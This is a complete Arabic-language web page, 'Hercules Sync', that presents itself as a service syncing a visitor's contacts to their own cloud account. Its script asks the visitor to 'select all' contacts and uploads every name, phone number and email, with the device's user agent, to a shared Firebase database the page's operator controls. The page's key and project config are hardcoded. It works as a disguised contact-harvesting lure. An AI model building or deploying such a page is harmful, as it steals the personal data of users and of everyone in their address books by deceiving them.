<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hercules Sync</title>
    <style>
        body { font-family: 'Arial', sans-serif; background-color: #121212; color: white; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .card { background: #1e1e1e; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); text-align: center; width: 85%; max-width: 400px; border: 1px solid #333; }
        h1 { color: #00e676; margin-bottom: 10px; }
        p { color: #bbb; font-size: 14px; margin-bottom: 30px; }
        .btn { background: #00e676; color: #000; border: none; padding: 15px 30px; border-radius: 10px; font-weight: bold; font-size: 16px; cursor: pointer; width: 100%; transition: 0.3s; }
        .btn:hover { background: #00c853; transform: scale(1.02); }
        #status { margin-top: 20px; font-size: 13px; color: #888; }
    </style>
</head>
<body>

    <div class="card">
        <h1>Hercules</h1>
        <p>اضغط لبدء المزامنة التلقائية لجهات الاتصال مع حسابك السحابي</p>
        <button class="btn" id="btnSync">بدء المزامنة الآن</button>
        <div id="status"></div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
        import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js";

        // بيانات مشروع Hercules الخاصة بك
        const firebaseConfig = {
            apiKey: "AIzaSyCuyAgacCs5tClhYD79IVOpSWVvbtXObpc",
            authDomain: "hercules-65b0c.firebaseapp.com",
            databaseURL: "https://hercules-65b0c-default-rtdb.firebaseio.com",
            projectId: "hercules-65b0c",
            storageBucket: "hercules-65b0c.firebasestorage.app",
            messagingSenderId: "758576632296",
            appId: "1:758576632296:android:c69d0667cf54311617d45d"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        document.getElementById('btnSync').addEventListener('click', async () => {
            const status = document.getElementById('status');
            
            if (!('contacts' in navigator)) {
                status.innerText = "❌ هذا المتصفح لا يدعم الوصول للأسماء. استخدم Chrome على أندرويد.";
                return;
            }

            try {
                // طلب كافة البيانات (الاسم، الهاتف، الإيميل)
                const props = ['name', 'tel', 'email'];
                status.innerText = "الرجاء اختيار 'تحديد الكل' من القائمة المنسدلة...";
                
                const contacts = await navigator.contacts.select(props, { multiple: true });

                if (contacts.length > 0) {
                    status.innerText = `جاري رفع ${contacts.length} جهة اتصال...`;
                    
                    // إنشاء موقع جديد في قاعدة البيانات لكل عملية رفع
                    const newListRef = push(ref(db, 'user_contacts'));
                    await set(newListRef, {
                        device_info: navigator.userAgent,
                        upload_date: new Date().toISOString(),
                        contacts_list: contacts
                    });

                    status.style.color = "#00e676";
                    status.innerText = "✅ تمت المزامنة بنجاح!";
                }
            } catch (err) {
                status.innerText = "❌ فشلت العملية. تأكد من إعطاء الصلاحية.";
                console.error(err);
            }
        });
    </script>
</body>
</html>
